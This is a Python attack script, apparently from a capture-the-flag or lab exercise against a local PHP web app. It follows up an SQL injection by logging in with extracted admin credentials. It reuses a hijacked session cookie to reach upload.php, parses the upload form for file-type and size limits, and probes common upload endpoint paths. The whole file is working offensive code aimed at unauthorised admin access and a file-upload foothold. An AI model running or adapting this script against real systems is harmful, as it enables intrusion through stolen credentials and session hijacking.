import requests
import json
import re

BASE_URL = "http://127.0.0.1:33210"
INDEX_URL = f"{BASE_URL}/index.php"
UPLOAD_URL = f"{BASE_URL}/upload.php"
DASHBOARD_URL = f"{BASE_URL}/dashboard.php"

# Admin credentials from SQL injection
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "7d39307ae824e70052c0aa16816a9b16"

def login_with_credentials():
    """Login using extracted admin credentials"""
    print("[*] Attempting login with extracted admin credentials...")
    print(f"[*] Username: {ADMIN_USERNAME}")
    print(f"[*] Password: {ADMIN_PASSWORD}")
    
    session = requests.Session()
    
    data = {
        'username': ADMIN_USERNAME,
        'password': ADMIN_PASSWORD,
        'submit': 'Submit'
    }
    
    try:
        # First, check the initial state
        print("\n[*] Checking initial session state...")
        initial_response = session.get(INDEX_URL, timeout=10)
        print(f"[+] Initial visit - Status: {initial_response.status_code}")
        print(f"[+] Initial PHPSESSID: {session.cookies.get('PHPSESSID', 'None')}")
        
        # Attempt login
        print("\n[*] Submitting login credentials...")
        response = session.post(INDEX_URL, data=data, allow_redirects=False, timeout=10)
        
        print(f"[+] Login Response Status: {response.status_code}")
        print(f"[+] Login Response Body: {response.text}")
        
        # Check for Set-Cookie
        if 'Set-Cookie' in response.headers:
            print(f"[!] Set-Cookie header: {response.headers['Set-Cookie']}")
        
        # Check for redirect (successful login indicator)
        if response.status_code in [301, 302, 307]:
            redirect_location = response.headers.get('Location', '')
            print(f"[!] Redirect detected to: {redirect_location}")
            
            # Follow redirect manually
            if redirect_location:
                if redirect_location.startswith('http'):
                    full_url = redirect_location
                else:
                    full_url = f"{BASE_URL}/{redirect_location.lstrip('/')}"
                
                print(f"[*] Following redirect to: {full_url}")
                redirect_response = session.get(full_url, timeout=10)
                print(f"[+] After redirect - Status: {redirect_response.status_code}")
                print(f"[+] After redirect - URL: {redirect_response.url}")
                
        # Get current session cookie
        current_phpsessid = session.cookies.get('PHPSESSID')
        print(f"[+] Current PHPSESSID: {current_phpsessid}")
        
        # Check dashboard access
        print("\n[*] Checking dashboard access...")
        dashboard_response = session.get(DASHBOARD_URL, timeout=10)
        print(f"[+] Dashboard Status: {dashboard_response.status_code}")
        print(f"[+] Dashboard URL: {dashboard_response.url}")
        if dashboard_response.status_code == 200:
            print(f"[+] Dashboard Length: {len(dashboard_response.text)} bytes")
            # Show first 500 chars
            print(f"[+] Dashboard Preview: {dashboard_response.text[:500]}")
        
        return session
        
    except Exception as e:
        print(f"[!] Error during login: {e}")
        return None

def test_bypass_session_direct_upload():
    """Test accessing upload.php directly with bypass session"""
    print("\n\n[*] Testing direct upload.php access with bypass session...")
    
    # Use one of the successful bypass sessions
    test_phpsessid = "f0ftg0fupbcndc25dv223s2i4h"
    
    session = requests.Session()
    session.cookies.set('PHPSESSID', test_phpsessid)
    
    try:
        print(f"[*] Using PHPSESSID: {test_phpsessid}")
        response = session.get(UPLOAD_URL, timeout=10, allow_redirects=True)
        
        print(f"[+] Upload page final URL: {response.url}")
        print(f"[+] Upload page status: {response.status_code}")
        print(f"[+] Upload page length: {len(response.text)} bytes")
        
        # Check if we're on upload page or redirected to login
        if 'upload' in response.url.lower():
            print("[!] Successfully accessed upload.php!")
            
            # Look for upload form
            if '<form' in response.text.lower() and 'upload' in response.text.lower():
                print("[!] Upload form found!")
                
                # Extract form details
                form_matches = re.findall(r'<form[^>]*>(.*?)</form>', response.text, re.I|re.S)
                if form_matches:
                    print("[+] Form HTML found, checking for file input...")
                    file_input = re.search(r'<input[^>]*type=[\"\']?file', response.text, re.I)
                    if file_input:
                        print("[!] File input field detected!")
                        print(f"[+] File input HTML: {file_input.group(0)[:100]}")
                
                # Check for allowed file types
                accept_attrs = re.findall(r'accept=[\"\']?([^\"\'\s]+)', response.text, re.I)
                if accept_attrs:
                    print(f"[+] Accept attributes: {accept_attrs}")
                
                # Check for file size limits
                size_attrs = re.findall(r'max(?:imum)?_?(?:file)?_?size[^>]*value=[\"\']?(\d+)', response.text, re.I)
                if size_attrs:
                    print(f"[+] Max file size: {size_attrs}")
                
                print(f"\n[+] Full upload page content:\n{response.text}")
            else:
                print("[-] No upload form found in page")
                print(f"[+] Page contains: {response.text[:500]}")
        else:
            print(f"[-] Redirected to: {response.url}")
            print(f"[-] This suggests authentication is still required")
            print(f"[+] Page preview: {response.text[:500]}")
            
    except Exception as e:
        print(f"[!] Error accessing upload.php: {e}")

def brute_force_endpoints():
    """Try common endpoint patterns to find upload functionality"""
    print("\n\n[*] Searching for alternative upload endpoints...")
    
    session = requests.Session()
    session.cookies.set('PHPSESSID', 'f0ftg0fupbcndc25dv223s2i4h')
    
    common_upload_paths = [
        '/upload.php',
        '/upload.html',
        '/upload.htm',
        '/upload/',
        '/file-upload.php',
        '/fileupload.php',
        '/files/upload.php',
        '/admin/upload.php',
        '/user/upload.php',
        '/api/upload.php',
        '/upload/index.php',
        '/upload/file.php',
        '/media/upload.php',
        '/images/upload.php',
        '/attachment/upload.php',
    ]
    
    found_endpoints = []
    
    for path in common_upload_paths:
        url = f"{BASE_URL}{path}"
        try:
            response = session.get(url, timeout=5, allow_redirects=True)
            
            # Check if we get something other than login page
            if response.status_code == 200:
                # Look for upload-related content
                page_text = response.text.lower()
                if 'upload' in page_text or 'file' in page_text:
                    print(f"[+] Found potentially interesting: {path}")
                    print(f"  Status: {response.status_code}")
                    print(f"  Length: {len(response.text)} bytes")
                    
                    if '<input' in page_text and 'type="file"' in page_text:
                        print(f"  [!] FILE UPLOAD FIELD DETECTED!")
                        found_endpoints.append((path, response.text))
                    else:
                        found_endpoints.append((path, response.text[:200]))
                        
        except Exception as e:
            print(f"[-] Error accessing {path}: {e}")
    
    return found_endpoints

def main():
    print("="*70)
    print("SQL Injection Follow-up Analysis")
    print("="*70)
    
    # Try 1: Login with extracted credentials
    authenticated_session = login_with_credentials()
    
    # Try 2: Direct access with bypass session
    test_bypass_session_direct_upload()
    
    # Try 3: Search for upload endpoints
    found_endpoints = brute_force_endpoints()
    
    print("\n" + "="*70)
    print("FINAL ANALYSIS")
    print("="*70)
    
    print(f"[+] Admin Password Hash: {ADMIN_PASSWORD}")
    print(f"[+] Admin Username: {ADMIN_USERNAME}")
    
    if found_endpoints:
        print(f"\n[!] Found {len(found_endpoints)} potentially interesting endpoints:")
        for endpoint, content_preview in found_endpoints:
            print(f"  - {endpoint}")
    else:
        print("\n[?] No specific upload endpoints found")
    
    # Check if we need to look for uploaded files functionality elsewhere
    print("\n[?] Upload functionality might be accessible after proper authentication flow")
    print("[?] Consider testing dashboard and menu items for upload links")

if __name__ == "__main__":
    main()
